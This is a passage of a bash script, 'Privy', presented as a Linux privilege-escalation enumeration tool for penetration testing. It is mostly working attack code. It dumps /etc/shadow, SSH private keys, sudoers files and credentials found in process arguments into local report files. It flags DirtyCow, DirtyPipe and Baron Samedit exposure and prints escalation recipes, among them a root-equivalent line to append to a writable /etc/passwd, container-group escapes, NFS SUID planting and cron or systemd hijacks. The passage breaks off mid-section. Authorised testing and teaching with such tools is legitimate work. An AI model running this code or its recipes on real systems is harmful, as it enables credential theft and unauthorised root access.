#!/bin/bash
# ============================================================================
#  ██████╗ ██████╗ ██╗██╗   ██╗██╗   ██╗
#  ██╔══██╗██╔══██╗██║██║   ██║╚██╗ ██╔╝
#  ██████╔╝██████╔╝██║██║   ██║ ╚████╔╝
#  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝  ╚██╔╝
#  ██║     ██║  ██║██║ ╚████╔╝    ██║
#  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝
# ============================================================================
#  Linux Privilege Escalation Enumeration Tool
#  Author : Pentest-Ready
#  Version: 1.6
#  Usage  : chmod +x privy.sh && ./privy.sh
# ============================================================================

# --------------------------------------------------
#  Color definitions
# --------------------------------------------------
RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[0;33m'
BLU='\033[0;34m'
MAG='\033[0;35m'
CYN='\033[0;36m'
WHT='\033[1;37m'
RST='\033[0m'

# --------------------------------------------------
#  Output directory structure
# --------------------------------------------------
main="Privy"
sys="$main/SysInfo.txt"
ugo="$main/UserGroupInfo.txt"
svc="$main/RootServices.txt"
suid="$main/SUID-GUID.txt"
cronned="$main/CronJobs.txt"
path_info="$main/PATH-Info.txt"
netstuff="$main/NetworkInfo.txt"
shdw="$main/Shadow.txt"
pswd="$main/Passwd.txt"
sql="$main/MySQL.txt"
keys="$main/SSHKeys.txt"
fs="$main/FileSystem.txt"
logs="$main/InterestingLogs.txt"
devtools="$main/DevTools.txt"
history="$main/Histories.txt"
thirdparty="$main/ThirdPartyApps.txt"
findings="$main/00-FINDINGS.txt"
exploit="$main/01-ExploitPaths.txt"

# --------------------------------------------------
#  Helper functions
# --------------------------------------------------
banner() {
    echo -e "${CYN}"
    echo "  ============================================================================"
    echo "   ██████╗ ██████╗ ██╗██╗   ██╗██╗   ██╗"
    echo "   ██╔══██╗██╔══██╗██║██║   ██║╚██╗ ██╔╝"
    echo "   ██████╔╝██████╔╝██║██║   ██║ ╚████╔╝"
    echo "   ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝  ╚██╔╝"
    echo "   ██║     ██║  ██║██║ ╚████╔╝    ██║"
    echo "   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝"
    echo "  ============================================================================"
    echo -e "${YLW}   Linux Privilege Escalation Enumeration Tool v1.6${RST}"
    echo -e "${CYN}  ============================================================================${RST}"
    echo ""
}

section_header() {
    local label="$1"
    local outfile="$2"
    echo -e "${GRN}[+] ${WHT}${label}${RST}"
    echo "======================================================================" >> "$outfile"
    echo "[+] ${label}" >> "$outfile"
    echo "======================================================================" >> "$outfile"
    echo "" >> "$outfile"
}

sub_header() {
    local label="$1"
    local outfile="$2"
    echo -e "    ${YLW}> ${label}${RST}"
    echo "----------------------------------------------------------------------" >> "$outfile"
    echo "  > ${label}" >> "$outfile"
    echo "----------------------------------------------------------------------" >> "$outfile"
}

run_cmd() {
    local label="$1"
    local cmd="$2"
    local outfile="$3"
    echo -e "    ${CYN}${label}${RST}"
    echo -e "\033[0;32m${cmd}\033[0m" >> "$outfile"
    echo "--------" >> "$outfile"
    eval "$cmd" >> "$outfile" 2>/dev/null
    echo "" >> "$outfile"
}

separator() {
    local outfile="$1"
    echo "" >> "$outfile"
    echo "======================================================================" >> "$outfile"
    echo "" >> "$outfile"
}

check_readable() {
    local file="$1"
    if [ -r "$file" ]; then
        return 0
    fi
    return 1
}

finding() {
    local msg="$1"
    local outfile="$2"
    echo -e "    ${RED}[!!] ${msg}${RST}"
    echo "" >> "$outfile"
    echo "  [!!] FINDING: ${msg}" >> "$outfile"
    echo "" >> "$outfile"
    echo "[!!] ${msg}  (see ${outfile##*/})" >> "$findings"
}

# --------------------------------------------------
#  Initialise
# --------------------------------------------------
banner

if [ -d "$main" ]; then
    echo -e "${YLW}[!] Directory '$main' already exists. Backing up...${RST}"
    mv "$main" "${main}_bak_$(date +%s)"
fi

mkdir -p "$main"
echo "======================================================================" > "$findings"
echo "  PRIVY — FINDINGS SUMMARY" >> "$findings"
echo "  Generated: $(date)" >> "$findings"
echo "  Host: $(hostname)" >> "$findings"
echo "  User: $(whoami)" >> "$findings"
echo "======================================================================" >> "$findings"
echo "" >> "$findings"
echo -e "${GRN}[+] Output directory created: ${WHT}$(pwd)/$main${RST}"
echo -e "${GRN}[+] Scan started: ${WHT}$(date)${RST}"
echo ""

# Store start time
start_time=$(date +%s)

# ============================================================================
#  1. SYSTEM INFORMATION
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 1 : SYSTEM INFORMATION${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "System Information" "$sys"
echo "[+] System Info" >> "$sys"
echo "======================================================================" >> "$sys"
date >> "$sys"
echo "" >> "$sys"

sub_header "Kernel & OS" "$sys"
run_cmd "uname -a" "uname -a" "$sys"
run_cmd "Kernel version" "cat /proc/version" "$sys"
run_cmd "/etc/issue" "cat /etc/issue" "$sys"
run_cmd "/etc/*-release" "cat /etc/*-release" "$sys"
run_cmd "Architecture" "uname -mrs" "$sys"

sub_header "Kernel CVE Check" "$sys"
kernel_ver=$(uname -r | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+' | head -1)
k_major=$(echo "$kernel_ver" | cut -d. -f1)
k_minor=$(echo "$kernel_ver" | cut -d. -f2)
k_patch=$(echo "$kernel_ver" | cut -d. -f3)
is_dirtycow=0
is_dirtypipe=0
if [ -n "$k_major" ] && [ -n "$k_minor" ]; then
    # DirtyCow CVE-2016-5195: kernel < 4.8.3
    if [ "$k_major" -lt 4 ]; then
        is_dirtycow=1
    elif [ "$k_major" -eq 4 ] && [ "$k_minor" -lt 8 ]; then
        is_dirtycow=1
    elif [ "$k_major" -eq 4 ] && [ "$k_minor" -eq 8 ] && [ "${k_patch:-0}" -lt 3 ]; then
        is_dirtycow=1
    fi
    # DirtyPipe CVE-2022-0847: 5.8 <= kernel < 5.16.11
    if [ "$k_major" -eq 5 ]; then
        if [ "$k_minor" -ge 8 ] && [ "$k_minor" -lt 16 ]; then
            is_dirtypipe=1
        elif [ "$k_minor" -eq 16 ] && [ "${k_patch:-0}" -lt 11 ]; then
            is_dirtypipe=1
        fi
    fi
fi
if [ "$is_dirtycow" -eq 1 ]; then
    finding "Kernel $kernel_ver may be vulnerable to DirtyCow (CVE-2016-5195) — local root!" "$sys"
fi
if [ "$is_dirtypipe" -eq 1 ]; then
    finding "Kernel $kernel_ver may be vulnerable to DirtyPipe (CVE-2022-0847) — local root!" "$sys"
fi

sub_header "Hostname & Domain" "$sys"
run_cmd "Hostname" "hostname" "$sys"
run_cmd "DNS Domain" "dnsdomainname" "$sys"

sub_header "Environment Variables" "$sys"
run_cmd "env" "env" "$sys"
run_cmd "set" "set" "$sys"

sub_header "Loaded Kernel Modules" "$sys"
run_cmd "lsmod" "lsmod" "$sys"

sub_header "Disk & Mount Info" "$sys"
run_cmd "df -h" "df -h" "$sys"
run_cmd "mount" "mount" "$sys"
run_cmd "/etc/fstab" "cat /etc/fstab" "$sys"

separator "$sys"
echo -e "${GRN}    [✓] Saved → ${WHT}$sys${RST}"
echo ""

# ============================================================================
#  2. USER & GROUP INFORMATION
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 2 : USER & GROUP INFORMATION${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "User/Group Info" "$ugo"

sub_header "Current User Context" "$ugo"
run_cmd "whoami" "whoami" "$ugo"
run_cmd "id" "id" "$ugo"
run_cmd "groups" "groups" "$ugo"
# Flag dangerous group memberships
if id | grep -qE '\blxd\b|\blxc\b'; then
    finding "Current user is in lxd/lxc group — mount host FS via privileged container for instant root!" "$ugo"
fi
if id | grep -qE '\bdocker\b'; then
    finding "Current user is in docker group — mount host FS via container for instant root!" "$ugo"
fi
if id | grep -qE '\bdisk\b'; then
    finding "Current user is in disk group — direct read/write access to block devices!" "$ugo"
fi

sub_header "Sudo Permissions" "$ugo"
run_cmd "sudo -n -l" "sudo -n -l" "$ugo"
sudo_result=$(sudo -n -l 2>/dev/null)
if echo "$sudo_result" | grep -qiE 'NOPASSWD|ALL' 2>/dev/null; then
    finding "Sudo permissions found with NOPASSWD or ALL — check for privesc!" "$ugo"
fi

sub_header "Sudo Version (CVE Check)" "$ugo"
run_cmd "sudo --version" "sudo --version 2>/dev/null | head -1" "$ugo"
sudo_ver=$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+[^ ]*')
sudo_major=$(echo "$sudo_ver" | cut -d. -f1)
sudo_minor=$(echo "$sudo_ver" | cut -d. -f2 | grep -oE '^[0-9]+')
sudo_patch=$(echo "$sudo_ver" | grep -oE '\.[0-9]+[a-z]?[0-9]*$' | grep -oE '^[.][0-9]+' | tr -d '.')
sudo_plevel=$(echo "$sudo_ver" | grep -oE 'p[0-9]+$' | tr -d 'p')
# Baron Samedit: vulnerable if sudo < 1.9.5p2
is_baron_vulnerable=0
if [ -n "$sudo_major" ] && [ -n "$sudo_minor" ]; then
    if [ "$sudo_major" -lt 1 ]; then
        is_baron_vulnerable=1
    elif [ "$sudo_major" -eq 1 ]; then
        if [ "$sudo_minor" -lt 9 ]; then
            is_baron_vulnerable=1
        elif [ "$sudo_minor" -eq 9 ]; then
            sp=${sudo_patch:-0}
            pl=${sudo_plevel:-0}
            if [ "$sp" -lt 5 ]; then
                is_baron_vulnerable=1
            elif [ "$sp" -eq 5 ] && [ "$pl" -lt 2 ]; then
                is_baron_vulnerable=1
            fi
        fi
    fi
fi
if [ "$is_baron_vulnerable" -eq 1 ]; then
    finding "Sudo $sudo_ver may be vulnerable to Baron Samedit CVE-2021-3156 — local root regardless of sudoers!" "$ugo"
fi

sub_header "Sudoers Files (direct read)" "$ugo"
run_cmd "/etc/sudoers" "cat /etc/sudoers 2>/dev/null" "$ugo"
run_cmd "/etc/sudoers.d/" "ls -la /etc/sudoers.d/ 2>/dev/null" "$ugo"
run_cmd "sudoers.d contents" "cat /etc/sudoers.d/* 2>/dev/null" "$ugo"

sub_header "All Users" "$ugo"
run_cmd "Users list" "cat /etc/passwd | cut -d: -f1" "$ugo"
run_cmd "UID 0 (root) accounts" "grep -v -E '^#' /etc/passwd | awk -F: '\$3 == 0 { print \$1}'" "$ugo"
uid0_count=$(grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0 { print $1}' 2>/dev/null | wc -l)
if [ "$uid0_count" -gt 1 ]; then
    finding "Multiple UID 0 accounts found ($uid0_count) — check for backdoor root accounts!" "$ugo"
fi
run_cmd "Users with login shells" "grep -vE 'nologin|false' /etc/passwd" "$ugo"

sub_header "Logged-In / Recent Users" "$ugo"
run_cmd "who" "who" "$ugo"
run_cmd "w" "w" "$ugo"
run_cmd "last (recent 20)" "last -20" "$ugo"
run_cmd "lastlog" "lastlog" "$ugo"

sub_header "Group Memberships" "$ugo"
run_cmd "/etc/group" "cat /etc/group" "$ugo"

sub_header "Home Directories" "$ugo"
run_cmd "ls /home" "ls -la /home/" "$ugo"
for userdir in /home/*/; do
    if [ -d "$userdir" ]; then
        run_cmd "ls $userdir" "ls -la $userdir" "$ugo"
    fi
done
run_cmd "ls /root" "ls -la /root/" "$ugo"
if [ -r /root ]; then
    finding "/root directory is readable by current user!" "$ugo"
fi

sub_header "Mail" "$ugo"
run_cmd "/var/mail" "ls -la /var/mail/" "$ugo"
run_cmd "/var/spool/mail" "ls -la /var/spool/mail/" "$ugo"

separator "$ugo"
echo -e "${GRN}    [✓] Saved → ${WHT}$ugo${RST}"
echo ""

# ============================================================================
#  3. PASSWD & SHADOW
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 3 : PASSWD & SHADOW FILES${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "Passwd File" "$pswd"
run_cmd "/etc/passwd" "cat /etc/passwd" "$pswd"
if [ -w /etc/passwd ]; then
    finding "/etc/passwd is WRITABLE — can append root-equivalent user directly (e.g. newroot:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash)!" "$pswd"
fi
separator "$pswd"
echo -e "${GRN}    [✓] Saved → ${WHT}$pswd${RST}"

section_header "Shadow File" "$shdw"
if check_readable /etc/shadow; then
    run_cmd "/etc/shadow (READABLE!)" "cat /etc/shadow" "$shdw"
    finding "/etc/shadow is READABLE — crack these hashes!" "$shdw"
else
    echo "  /etc/shadow is not readable by current user." >> "$shdw"
    echo -e "    ${YLW}[—] /etc/shadow not readable${RST}"
fi
separator "$shdw"
echo -e "${GRN}    [✓] Saved → ${WHT}$shdw${RST}"
echo ""

# ============================================================================
#  4. ROOT SERVICES & RUNNING PROCESSES
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 4 : SERVICES & PROCESSES${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "Services & Processes" "$svc"

sub_header "All Running Processes" "$svc"
run_cmd "ps aux" "ps aux" "$svc"

sub_header "Processes Running as Root" "$svc"
run_cmd "ps aux | grep root" "ps aux | grep root" "$svc"

sub_header "Credentials in Process Arguments" "$svc"
proc_creds=$(ps auxww 2>/dev/null | grep -iE -- '-p[A-Za-z0-9]|password=|passwd=|--pass[= ]|token=|api[_-]?key=|secret=' | grep -vE 'grep|privy\.sh')
if [ -n "$proc_creds" ]; then
    finding "Credentials/tokens detected in process arguments — review ps output!" "$svc"
    echo "$proc_creds" >> "$svc"
    echo "" >> "$svc"
fi

sub_header "Listening Services" "$svc"
run_cmd "ss -tulnp" "ss -tulnp" "$svc"
run_cmd "netstat -tulnp" "netstat -tulnp" "$svc"

sub_header "Localhost-Only Services (pivot candidates)" "$svc"
loopback_svcs=$(ss -tlnp 2>/dev/null | awk 'NR>1 && ($4 ~ /^127\./ || $4 ~ /^\[::1\]/)')
if [ -n "$loopback_svcs" ]; then
    echo "  Services bound to loopback only — consider SSH port forwarding to reach them:" >> "$svc"
    echo "$loopback_svcs" >> "$svc"
    echo "" >> "$svc"
    echo "  Example: ssh -L 8080:127.0.0.1:8080 user@target" >> "$svc"
    echo "" >> "$svc"
fi

sub_header "Installed Services" "$svc"
run_cmd "/etc/services (first 50)" "head -50 /etc/services" "$svc"

sub_header "Service Configuration Files" "$svc"
for conf in /etc/apache2/apache2.conf /etc/httpd/conf/httpd.conf /etc/nginx/nginx.conf \
            /etc/my.cnf /etc/mysql/my.cnf /etc/syslog.conf /etc/cups/cupsd.conf \
            /etc/inetd.conf /etc/xinetd.conf /opt/lampp/etc/httpd.conf; do
    if [ -r "$conf" ]; then
        run_cmd "$conf" "cat $conf" "$svc"
    fi
done

sub_header "Web Server Vhost Configs" "$svc"
for vhostdir in /etc/apache2/sites-enabled /etc/apache2/sites-available \
                /etc/nginx/sites-enabled /etc/nginx/sites-available \
                /etc/nginx/conf.d /etc/httpd/conf.d; do
    if [ -d "$vhostdir" ]; then
        run_cmd "$vhostdir" "grep -rIl '' $vhostdir 2>/dev/null" "$svc"
        vhost_creds=$(grep -rIEl 'auth_basic|AuthUserFile|proxy_pass|password|passwd' "$vhostdir" 2>/dev/null)
        if [ -n "$vhost_creds" ]; then
            finding "Vhost config(s) contain auth or credential directives: $vhostdir" "$svc"
            echo "$vhost_creds" | while read -r vf; do
                run_cmd "$vf" "cat $vf" "$svc"
            done
        fi
    fi
done

sub_header "Installed Packages (snippet)" "$svc"
run_cmd "dpkg -l (first 30)" "dpkg -l 2>/dev/null | head -30" "$svc"
run_cmd "rpm -qa (first 30)" "rpm -qa 2>/dev/null | head -30" "$svc"

sub_header "Writable Systemd Service Files" "$svc"
run_cmd "find writable .service" "find /etc/systemd /lib/systemd /usr/lib/systemd -name '*.service' -writable 2>/dev/null" "$svc"
writable_services=$(find /etc/systemd /lib/systemd /usr/lib/systemd -name '*.service' -writable 2>/dev/null)
if [ -n "$writable_services" ]; then
    finding "Writable systemd service file(s) found — modify ExecStart for root command execution on next service restart!" "$svc"
    echo "$writable_services" | while read -r sf; do
        echo "       → $sf" >> "$svc"
    done
fi

sub_header "Live Terminal Sessions (tmux / screen)" "$svc"
run_cmd "tmux list-sessions" "tmux list-sessions 2>/dev/null" "$svc"
run_cmd "screen -ls" "screen -ls 2>/dev/null" "$svc"
run_cmd "/var/run/screen" "ls -la /var/run/screen/ 2>/dev/null" "$svc"
if tmux list-sessions 2>/dev/null | grep -qi 'root\|0:'; then
    finding "Active tmux session detected — try: tmux attach-session -t <id>" "$svc"
fi

separator "$svc"
echo -e "${GRN}    [✓] Saved → ${WHT}$svc${RST}"
echo ""

# ============================================================================
#  5. CRON JOBS & SCHEDULED TASKS
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 5 : CRON JOBS & SCHEDULED TASKS${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "Cron Jobs" "$cronned"

sub_header "Current User Crontab" "$cronned"
run_cmd "crontab -l" "crontab -l" "$cronned"

sub_header "System-wide Cron" "$cronned"
run_cmd "/etc/crontab" "cat /etc/crontab" "$cronned"
run_cmd "/etc/anacrontab" "cat /etc/anacrontab" "$cronned"

sub_header "Cron Directories" "$cronned"
for d in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -d "$d" ]; then
        run_cmd "ls $d" "ls -la $d" "$cronned"
        for f in "$d"/*; do
            if [ -f "$f" ] && [ -r "$f" ]; then
                run_cmd "Contents: $f" "cat $f" "$cronned"
                if [ -w "$f" ]; then
                    finding "Writable cron script: $f — cron job hijack possible!" "$cronned"
                fi
            fi
        done
    fi
done
# Check if /etc/crontab is writable
if [ -w /etc/crontab ]; then
    finding "/etc/crontab is WRITABLE — can inject scheduled commands!" "$cronned"
fi
# Collect writable cron scripts for Phase 15 (avoid duplicate walk)
writable_crons_found=$(find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly -writable -type f 2>/dev/null)
if [ -w /etc/crontab ]; then
    writable_crons_found="${writable_crons_found:+${writable_crons_found}$'\n'}/etc/crontab"
fi

sub_header "Writable MOTD Scripts" "$cronned"
writable_motd=$(find /etc/update-motd.d/ -writable -type f 2>/dev/null)
if [ -n "$writable_motd" ]; then
    finding "Writable MOTD script(s) — execute as root on next SSH login!" "$cronned"
    echo "$writable_motd" | while read -r mf; do
        echo "       → $mf" >> "$cronned"
    done
fi

sub_header "Spool Crons" "$cronned"
run_cmd "/var/spool/cron" "ls -la /var/spool/cron/" "$cronned"
run_cmd "/var/spool/cron/crontabs" "ls -la /var/spool/cron/crontabs/" "$cronned"

sub_header "At Jobs" "$cronned"
run_cmd "/etc/at.allow" "cat /etc/at.allow" "$cronned"
run_cmd "/etc/at.deny" "cat /etc/at.deny" "$cronned"
run_cmd "atq" "atq" "$cronned"

sub_header "Systemd Timers" "$cronned"
run_cmd "systemctl list-timers" "systemctl list-timers --all" "$cronned"

separator "$cronned"
echo -e "${GRN}    [✓] Saved → ${WHT}$cronned${RST}"
echo ""

# ============================================================================
#  6. PATH & ENVIRONMENT INFO
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 6 : PATH & ENVIRONMENT${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "PATH Info" "$path_info"

sub_header "Current PATH" "$path_info"
run_cmd "echo \$PATH" "echo \$PATH" "$path_info"

sub_header "Writable PATH Directories" "$path_info"
echo -e "\033[0;32mChecking writable dirs in PATH\033[0m" >> "$path_info"
echo "--------" >> "$path_info"
writable_path_dirs=""
IFS=':' read -ra PATHDIRS <<< "$PATH"
for dir in "${PATHDIRS[@]}"; do
    if [ -w "$dir" ]; then
        echo "  [WRITABLE] $dir" >> "$path_info"
        finding "Writable PATH directory: $dir — PATH hijack possible!" "$path_info"
        writable_path_dirs="$writable_path_dirs $dir"
    else
        echo "  [OK]       $dir" >> "$path_info"
    fi
done
echo "" >> "$path_info"

sub_header "Shell Profiles" "$path_info"
for prof in /etc/profile /etc/bashrc ~/.bash_profile ~/.bashrc ~/.bash_logout ~/.profile; do
    if [ -r "$prof" ]; then
        run_cmd "$prof" "cat $prof" "$path_info"
    fi
done

sub_header "LD_PRELOAD / LD_LIBRARY_PATH" "$path_info"
run_cmd "LD_PRELOAD" "echo \$LD_PRELOAD" "$path_info"
run_cmd "LD_LIBRARY_PATH" "echo \$LD_LIBRARY_PATH" "$path_info"
run_cmd "/etc/ld.so.conf" "cat /etc/ld.so.conf" "$path_info"
run_cmd "ldconfig" "ldconfig -p 2>/dev/null | head -20" "$path_info"

sub_header "Writable LD Config (library hijack)" "$path_info"
run_cmd "ls /etc/ld.so.conf.d/" "ls -la /etc/ld.so.conf.d/ 2>/dev/null" "$path_info"
if [ -w /etc/ld.so.conf ]; then
    finding "/etc/ld.so.conf is WRITABLE — add a controlled path and run ldconfig to hijack shared libraries!" "$path_info"
fi
writable_ldconf=$(find /etc/ld.so.conf.d/ -writable -type f 2>/dev/null)
if [ -n "$writable_ldconf" ]; then
    finding "Writable file in /etc/ld.so.conf.d/ — shared library hijack possible!" "$path_info"
    echo "$writable_ldconf" | while read -r lf; do
        echo "       → $lf" >> "$path_info"
    done
fi

separator "$path_info"
echo -e "${GRN}    [✓] Saved → ${WHT}$path_info${RST}"
echo ""

# ============================================================================
#  7. NETWORK INFORMATION
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 7 : NETWORK INFORMATION${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "Network Info" "$netstuff"

sub_header "Interfaces" "$netstuff"
run_cmd "ip addr" "ip addr" "$netstuff"
run_cmd "ifconfig -a" "/sbin/ifconfig -a" "$netstuff"

sub_header "Routing" "$netstuff"
run_cmd "ip route" "ip route" "$netstuff"
run_cmd "route -n" "route -n" "$netstuff"

sub_header "DNS & Resolv" "$netstuff"
run_cmd "/etc/resolv.conf" "cat /etc/resolv.conf" "$netstuff"
run_cmd "/etc/hosts" "cat /etc/hosts" "$netstuff"

sub_header "ARP Cache" "$netstuff"
run_cmd "arp -e" "arp -e" "$netstuff"
run_cmd "ip neigh" "ip neigh" "$netstuff"

sub_header "Active Connections" "$netstuff"
run_cmd "ss -antp" "ss -antp" "$netstuff"
run_cmd "netstat -antup" "netstat -antup" "$netstuff"

sub_header "Firewall Rules" "$netstuff"
run_cmd "iptables -L -n" "iptables -L -n" "$netstuff"
run_cmd "iptables -L -n -t nat" "iptables -L -n -t nat" "$netstuff"
run_cmd "nftables" "nft list ruleset" "$netstuff"

sub_header "Network Configuration" "$netstuff"
run_cmd "/etc/network/interfaces" "cat /etc/network/interfaces" "$netstuff"
run_cmd "/etc/sysconfig/network" "cat /etc/sysconfig/network" "$netstuff"
run_cmd "/etc/networks" "cat /etc/networks" "$netstuff"

sub_header "NFS Shares (no_root_squash)" "$netstuff"
run_cmd "/etc/exports" "cat /etc/exports 2>/dev/null" "$netstuff"
run_cmd "showmount -e localhost" "showmount -e localhost 2>/dev/null" "$netstuff"
nfs_squash=$(grep 'no_root_squash' /etc/exports 2>/dev/null)
if [ -n "$nfs_squash" ]; then
    finding "NFS share with no_root_squash found — mount from attacker box, plant SUID binary, execute on target for root!" "$netstuff"
    echo "$nfs_squash" | while read -r line; do
        echo "       → $line" >> "$netstuff"
    done
fi

separator "$netstuff"
echo -e "${GRN}    [✓] Saved → ${WHT}$netstuff${RST}"
echo ""

# ============================================================================
#  8. SUID / SGID BINARIES
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 8 : SUID / SGID / CAPABILITIES${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "SUID/SGID Binaries & Capabilities" "$suid"

sub_header "SUID Binaries (run as owner)" "$suid"
run_cmd "find / -perm -u=s" "find / -perm -u=s -type f ! -path '/proc/*' ! -path '/sys/*' -exec ls -la {} \; 2>/dev/null" "$suid"

# Flag known GTFOBins SUID candidates
gtfo_suid="nmap|vim|find|bash|more|less|nano|cp|mv|awk|perl|python|ruby|gcc|node|php|env|strace|ltrace|taskset|docker|pkexec|doas|aria2c|ash|busybox|cat|chmod|chown|curl|cut|dash|dd|diff|ed|emacs|flock|gdb|git|install|ionice|ip|jq|ksh|ld|logsave|lua|make|mawk|nice|nl|pdb|pic|rsync|run-parts|rvim|screen|sed|setarch|ssh|start-stop-daemon|tar|tclsh|tee|time|timeout|ul|unexpand|unshare|watch|wget|xargs|xxd|zip|zsh"
suid_hits_full=$(find / -perm -u=s -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | grep -iE "/[^/]*(${gtfo_suid})[^/]*$" 2>/dev/null)
suid_hits=$(echo "$suid_hits_full" | grep -Eo "[^/]+$")
if [ -n "$suid_hits" ]; then
    echo "" >> "$suid"
    echo "  [!!] GTFOBins SUID candidates detected:" >> "$suid"
    echo "$suid_hits" | while read -r bin; do
        echo "       → $bin  (check https://gtfobins.github.io/gtfobins/${bin}/#suid)" >> "$suid"
    done
    finding "GTFOBins SUID candidates found: $(echo $suid_hits | tr '\n' ', ') — check for privesc!" "$suid"
fi

sub_header "SGID Binaries (run as group)" "$suid"
run_cmd "find / -perm -g=s" "find / -perm -g=s -type f ! -path '/proc/*' ! -path '/sys/*' -exec ls -la {} \; 2>/dev/null" "$suid"

# Flag known GTFOBins SGID candidates
gtfo_sgid="crontab|mail|write|wall|ssh-agent|screen|at|batch|chage|dotlockfile|expiry|locate|netstat|ping|newgrp|sg|lockfile|passwd|chfn|chsh|su|pkexec"
sgid_hits=$(find / -perm -g=s -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | grep -Eo "[^/]+$" | grep -iE "$gtfo_sgid" 2>/dev/null)
if [ -n "$sgid_hits" ]; then
    echo "" >> "$suid"
    echo "  [!!] GTFOBins SGID candidates detected:" >> "$suid"
    echo "$sgid_hits" | while read -r bin; do
        echo "       → $bin  (check https://gtfobins.github.io/gtfobins/${bin}/ — suid/sudo sections)" >> "$suid"
    done
    finding "GTFOBins SGID candidates found: $(echo $sgid_hits | tr '\n' ', ') — check for privesc!" "$suid"
fi

sub_header "Sticky Bit Directories" "$suid"
run_cmd "find / -perm -1000 -type d" "find / -perm -1000 -type d ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null" "$suid"

sub_header "Files with Capabilities" "$suid"
run_cmd "getcap -r /" "getcap -r / 2>/dev/null" "$suid"
cap_results=$(getcap -r / 2>/dev/null)
if [ -n "$cap_results" ]; then
    # Flag dangerous caps
    dangerous_caps=$(echo "$cap_results" | grep -iE 'cap_setuid|cap_setgid|cap_dac_override|cap_sys_admin|cap_sys_ptrace|cap_net_raw|cap_fowner')
    if [ -n "$dangerous_caps" ]; then
        finding "Dangerous capabilities found — potential privesc vector:" "$suid"
        echo "$dangerous_caps" | while read -r capline; do
            echo "       → $capline" >> "$suid"
        done
        echo "" >> "$suid"
    fi
fi

sub_header "World-Writable Files" "$suid"
run_cmd "find / -perm -2 -type f" "find / -perm -2 -type f 2>/dev/null | grep -v -E '^/proc/|^/sys/'" "$suid"

sub_header "World-Writable Directories" "$suid"
run_cmd "find / -perm -2 -type d" "find / -perm -2 -type d 2>/dev/null | grep -v -E '^/proc/|^/sys/'" "$suid"

sub_header "Noowner Files" "$suid"
run_cmd "find / -nouser -o -nogroup" "find / -xdev \( -nouser -o -nogroup \) -print 2>/dev/null | head -30" "$suid"

separator "$suid"
echo -e "${GRN}    [✓] Saved → ${WHT}$suid${RST}"
echo ""

# ============================================================================
#  9. SSH KEYS & CREDENTIALS
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 9 : SSH KEYS & CREDENTIALS${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "SSH Keys & Credentials" "$keys"

sub_header "SSH Directory Contents" "$keys"
run_cmd "~/.ssh/" "ls -la ~/.ssh/" "$keys"
for keyfile in ~/.ssh/authorized_keys ~/.ssh/id_rsa ~/.ssh/id_rsa.pub \
               ~/.ssh/id_dsa ~/.ssh/id_dsa.pub ~/.ssh/id_ecdsa ~/.ssh/id_ed25519 \
               ~/.ssh/identity ~/.ssh/identity.pub ~/.ssh/known_hosts; do
    if [ -r "$keyfile" ]; then
        run_cmd "$keyfile" "cat $keyfile" "$keys"
        finding "Readable SSH key: $keyfile" "$keys"
    fi
done

sub_header "SSH Config" "$keys"
run_cmd "/etc/ssh/sshd_config" "cat /etc/ssh/sshd_config" "$keys"
run_cmd "/etc/ssh/ssh_config" "cat /etc/ssh/ssh_config" "$keys"

sub_header "SSH Host Keys" "$keys"
for hk in /etc/ssh/ssh_host_*_key; do
    if [ -r "$hk" ]; then
        run_cmd "$hk (PRIVATE KEY READABLE!)" "ls -la $hk" "$keys"
        finding "SSH host PRIVATE key readable: $hk" "$keys"
    fi
done

sub_header "Other SSH Dirs (all users)" "$keys"
run_cmd "find .ssh dirs" "find /home -name '.ssh' -type d 2>/dev/null" "$keys"
run_cmd "find authorized_keys" "find / -name 'authorized_keys' -type f 2>/dev/null" "$keys"
run_cmd "find id_rsa" "find / -name 'id_rsa' -type f 2>/dev/null" "$keys"

sub_header "SSH Client Configs (lateral movement)" "$keys"
ssh_configs=$(find /home /root -name 'config' -path '*/.ssh/*' -readable 2>/dev/null)
if [ -n "$ssh_configs" ]; then
